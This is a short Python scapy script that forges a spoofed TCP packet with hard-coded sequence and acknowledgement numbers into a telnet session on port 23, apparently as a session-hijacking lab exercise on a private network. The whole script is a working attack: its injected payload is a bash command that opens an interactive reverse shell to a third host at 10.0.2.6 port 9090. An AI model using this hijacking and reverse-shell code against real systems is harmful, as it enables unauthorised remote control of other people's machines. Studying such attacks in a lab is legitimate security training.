#!/usr/bin/python

from scapy.all import *
print('begining reverse shell...')

ip = IP(src="10.0.2.8",dst="10.0.2.9")
tcp = TCP(sport=42554,dport=23,flags="A",seq=2129737136,ack=3865100680)
data = "\r /bin/bash -i >/dev/tcp/10.0.2.6/9090 2>&1 0<&1 \r"
pkt = ip/tcp/data
ls(pkt)

send(pkt,verbose=0)
